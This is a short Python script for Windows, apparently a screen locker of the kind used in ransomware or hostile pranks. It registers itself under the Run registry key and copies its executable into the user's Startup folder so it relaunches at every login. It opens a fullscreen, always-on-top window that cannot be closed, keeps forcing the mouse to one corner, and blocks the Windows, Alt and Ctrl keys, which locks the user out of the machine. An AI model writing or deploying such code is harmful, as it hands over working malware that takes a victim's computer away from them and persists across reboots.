import keyboard
import tkinter as tk
import threading
import mouse
import winreg
import shutil
from getpass import getuser
from pathlib import Path


global executing
global filename
executing = True
filename = "".join(["\\", __file__.split('\\')[-1].split('.')[0], ".exe"])

def create_autostart_regedit():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "encryt_py", 0, winreg.REG_SZ, f"{Path.cwd()}{filename}")
    except:
        print("error")
        
def create_autostart_dir():
    user = getuser()
    startup = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    try:
        shutil.copy(f"{Path.cwd()}{filename}", startup)
    except:
        print("error")
    
def disable_mouse():
    global executing
    while executing:
        mouse.move(1,0, absolute=True, duration=0)


def block_keys():
    keyboard.block_key("linke windows")
    keyboard.block_key("rechte windows")
    keyboard.block_key("left windows")
    keyboard.block_key("right windows")
    keyboard.block_key("alt")
    keyboard.block_key("strg")
    keyboard.wait()
    
def on_closing():
    pass

create_autostart_regedit()
create_autostart_dir()

root = tk.Tk()
root.attributes("-fullscreen", True, "-topmost", True)

root.protocol("WM_DELETE_WINDOW", on_closing)

threading.Thread(target=disable_mouse).start()
threading.Thread(target=block_keys).start()

root.mainloop()
